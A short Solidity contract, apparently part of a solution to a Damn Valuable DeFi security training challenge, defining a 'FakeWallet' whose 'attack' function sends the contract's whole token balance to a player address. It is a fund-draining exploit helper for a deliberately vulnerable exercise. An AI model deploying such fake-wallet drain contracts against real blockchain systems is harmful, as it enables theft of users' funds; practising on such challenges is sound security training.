//SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

import "../../DamnValuableToken.sol";

contract FakeWallet {

    function attack(address _token, address _player) external {
        DamnValuableToken token = DamnValuableToken(_token);
        token.transfer(_player, token.balanceOf(address(this)));
    }
}